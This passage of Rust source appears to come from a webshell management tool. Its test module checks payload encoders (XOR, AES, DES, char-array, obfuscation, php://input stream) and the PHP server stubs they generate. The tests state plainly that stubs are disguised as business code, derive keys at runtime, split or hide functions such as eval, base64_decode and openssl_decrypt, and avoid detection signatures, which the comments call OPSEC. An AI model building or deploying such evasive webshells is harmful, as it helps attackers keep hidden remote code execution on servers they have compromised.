        .map_err(|_| ProtocolError::ParseError("PHP_STREAM 载荷解码失败".to_string()))?;
    String::from_utf8(bytes)
        .map(|source| source.trim_start_matches("<?php").trim_start_matches("\n").to_string())
        .map_err(|_| ProtocolError::ParseError("PHP_STREAM 载荷解码失败".to_string()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xor_round_trip() {
        let key = md5_hex("secret").into_bytes();
        let original = b"hello dosword";
        let xored = XorBase64Encoder::xor(original, &key);
        assert_eq!(XorBase64Encoder::xor(&xored, &key), original);
    }

    #[test]
    fn xor_base64_encode_decodes_with_php_stub_key() {
        let encoder = XorBase64Encoder;
        let password = "secret";
        let code = "@ini_set(\"display_errors\",\"0\");echo 'hello';";
        let payload = encoder.encode(code, password);

        // 模拟服务端 stub 逻辑：base64 解码 → XOR 还原
        let key = encoder.derive_key(password);
        let key_bytes = key.into_bytes();
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(&payload)
            .unwrap();
        let restored = XorBase64Encoder::xor(&decoded, &key_bytes);
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn base64_encoder_is_plain() {
        let encoder = Base64Encoder;
        let payload = encoder.encode("echo 1;", "whatever");
        assert_eq!(
            String::from_utf8(
                base64::engine::general_purpose::STANDARD
                    .decode(&payload)
                    .unwrap()
            )
            .unwrap(),
            "echo 1;"
        );
    }

    #[test]
    fn stub_generation_all_languages() {
        for encoder in [&XorBase64Encoder as &dyn PayloadEncoder, &Base64Encoder as &dyn PayloadEncoder] {
            for language in STUB_LANGUAGES {
                let stub = encoder.stub(language, "secret").unwrap_or_else(|error| {
                    panic!("{} 生成 {language} stub 失败：{error}", encoder.id())
                });
                assert!(!stub.is_empty());
            }
        }
    }

    #[test]
    fn xor_stub_is_business_disguised() {
        let stub = XorBase64Encoder.stub("php", "secret").unwrap();
        // 业务伪装：密钥由 token 运行时派生，无内嵌密钥/明文密码
        assert!(!stub.contains("secret"), "stub 不应含明文密码");
        assert!(!stub.contains(&md5_hex("secret")), "stub 不应内嵌派生密钥");
        assert!(stub.contains("md5($token)"), "stub 应运行时派生密钥");
        // 业务外观：函数/注释形如正常业务
        for biz in ["verify_token", "unpack_session", "run_rule", "invalid_token", "会话状态查询"] {
            assert!(stub.contains(biz), "stub 应含业务元素 {biz}");
        }
    }

    #[test]
    fn unsupported_language_rejected() {
        let result = XorBase64Encoder.stub("python", "secret");
        assert!(result.is_err());
    }

    #[test]
    fn key_is_md5_hex() {
        assert_eq!(md5_hex("secret"), "5ebe2294ecd0e0f08eab7690d2a6ee69");
    }

    // --- 自加密编码器（AES / DES） ---

    #[test]
    fn aes_ecb_round_trip() {
        let encoder = Aes128EcbEncoder;
        let code = "@ini_set('display_errors','0');echo 1;";
        let payload = encoder.encode(code, "secret");
        // 载荷应为密文（不含明文特征）
        assert!(!payload.contains("@ini_set"));
        // 模拟 stub 解密：openssl 参数一致（key=md5hex 前16）
        let restored = aes_ecb_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &aes_key("secret"),
        )
        .unwrap();
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn aes_cbc_round_trip() {
        let encoder = Aes128CbcEncoder;
        let code = "echo 'cbc';";
        let payload = encoder.encode(code, "secret");
        let restored = aes_cbc_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &aes_key("secret"),
            &aes_iv("secret"),
        )
        .unwrap();
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn des_round_trip() {
        let encoder = DesEcbEncoder;
        let code = "echo 'des';";
        let payload = encoder.encode(code, "secret");
        let restored = des_ecb_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &des_key("secret"),
        )
        .unwrap();
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn wrong_password_aes_decrypt_fails() {
        let payload = Aes128EcbEncoder.encode("code", "secret");
        let result = aes_ecb_decrypt(
            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
            &aes_key("wrong"),
        );
        assert!(result.is_err(), "错误密码应解密失败");
    }

    #[test]
    fn aes_stub_is_business_disguised() {
        let stub = Aes128EcbEncoder.stub("php", "secret").unwrap();
        assert!(!stub.contains("secret"), "stub 不应含明文密码");
        // OPSEC：openssl_decrypt 拆分拼接调用，无完整函数名
        assert!(!stub.contains("openssl_decrypt"), "stub 不应含完整敏感函数名");
        assert!(stub.contains("md5($token)"), "stub 应运行时派生密钥");
    }

    /// OPSEC 静态特征检查：stub 不应出现小写 eval(/base64_decode(/$_POST['x']。
    #[test]
    fn php_stubs_have_no_plain_sensitive_tokens() {
        let encoders: Vec<&dyn PayloadEncoder> = vec![
            &Base64Encoder,
            &XorBase64Encoder,
            &Aes128EcbEncoder,
            &Aes128CbcEncoder,
            &DesEcbEncoder,
            &CharEncoder,
            &PhpObfuscateEncoder,
        ];
        for encoder in encoders {
            let stub = encoder.stub("php", "secret").expect("php stub 应生成");
            assert!(
                !stub.contains("eval("),
                "{} stub 不应含小写 eval(：{stub}",
                encoder.id()
            );
            assert!(
                !stub.contains("base64_decode("),
                "{} stub 不应含 base64_decode(",
                encoder.id()
            );
            assert!(
                !stub.contains("openssl_decrypt("),
                "{} stub 不应含 openssl_decrypt(",
                encoder.id()
            );
            assert!(
                !stub.contains("$_POST['x']"),
                "{} stub 不应含 $_POST['x']",
                encoder.id()
            );
            assert!(
                !stub.contains("base64_decode"),
                "{} stub 不应含 base64_decode（含任何片段）",
                encoder.id()
            );
            assert!(
                !stub.contains("openssl"),
                "{} stub 不应含 openssl（含任何片段）",
                encoder.id()
            );
            assert!(
                !stub.contains("DES-ECB") && !stub.contains("AES-128"),
                "{} stub 不应含明文 cipher 名",
                encoder.id()
            );
            assert!(
                stub.contains("crc32b") || encoder.body_mode(),
                "{} stub 应使用 crc32b 哈希查表（php_stream 除外）",
                encoder.id()
            );
            // 业务伪装：请求参数为业务语义（token/data）
            if !encoder.body_mode() {
                let (p1, p2) = encoder.form_params();
                assert!(
                    stub.contains(&format!("$_POST['{p1}']")),
                    "{} stub 应使用业务参数 {p1}",
                    encoder.id()
                );
                assert!(
                    stub.contains(&format!("$_POST['{p2}']")),
                    "{} stub 应使用业务参数 {p2}",
                    encoder.id()
                );
            }
        }
    }

    // --- 混淆编码器（CHAR / OBFUSCATE） ---

    #[test]
    fn char_encode_and_decode() {
        let encoder = CharEncoder;
        let code = "@ini_set('x',1);";
        let payload = encoder.encode(code, "ignored");
        // OPSEC：eval 大小写混合，但 chr 数组结构保留
        assert!(!payload.contains("eval("), "载荷不应含小写 eval(");
        assert!(
            payload.contains("implode('',array_map('chr',array("),
            "载荷应保留 chr 数组结构"
        );
        assert_eq!(char_decode(&payload).unwrap(), code);
    }

    #[test]
    fn obfuscate_encode_and_decode() {
        let encoder = PhpObfuscateEncoder;
        let code = "@ini_set('x',1);echo 'obf';";
        let payload = encoder.encode(code, "ignored");
        assert!(!payload.contains("@ini_set"), "载荷不应含明文");
        assert_eq!(obfuscate_decode(&payload).unwrap(), code);
    }

    #[test]
    fn new_encoders_php_stub_only() {
        for encoder in [
            &Aes128EcbEncoder as &dyn PayloadEncoder,
            &Aes128CbcEncoder as &dyn PayloadEncoder,
            &DesEcbEncoder as &dyn PayloadEncoder,
            &CharEncoder as &dyn PayloadEncoder,
            &PhpObfuscateEncoder as &dyn PayloadEncoder,
        ] {
            assert!(encoder.stub("php", "secret").is_ok(), "{} php stub 应成功", encoder.id());
            assert!(
                encoder.stub("aspx", "secret").is_err(),
                "{} aspx 应提示不支持",
                encoder.id()
            );
        }
    }

    #[test]
    fn registry_lists_all_encoders() {
        let ids: Vec<String> = EncoderRegistry::builtin()
            .list()
            .into_iter()
            .map(|(id, _)| id)
            .collect();
        assert_eq!(
            ids,
            vec![
                "aes128_cbc",
                "aes128_ecb",
                "base64",
                "char",
                "des",
                "php_obfuscate",
                "php_stream",
                "xor_base64",
            ]
        );
    }

    // --- PHP_STREAM：零敏感函数 stub ---

    #[test]
    fn php_stream_stub_has_no_sensitive_functions() {
        let stub = PhpStreamEncoder.stub("php", "secret").unwrap();
        for token in [
            "eval",
            "assert",
            "base64_decode",
            "openssl_decrypt",
            "$_POST",
            "$_GET",
            "system",
            "exec(",
        ] {
            assert!(!stub.contains(token), "stub 不应含 {token}：{stub}");
        }
        assert!(stub.contains("php://input"), "stub 应基于 php://input");
        assert!(stub.contains("convert.base64-decode"), "stub 应使用 base64 流过滤器");
    }

    #[test]
    fn php_stream_body_mode_encode() {
        let encoder = PhpStreamEncoder;
        assert!(encoder.body_mode(), "php_stream 应为 body 模式");
        let code = "@ini_set('display_errors','0');echo 1;";
        let payload = encoder.encode(code, "ignored");
        // 载荷是完整源码的 base64（含 <?php 标签）
        let restored = php_stream_decode(&payload).unwrap();
        assert_eq!(restored, code);
    }
}
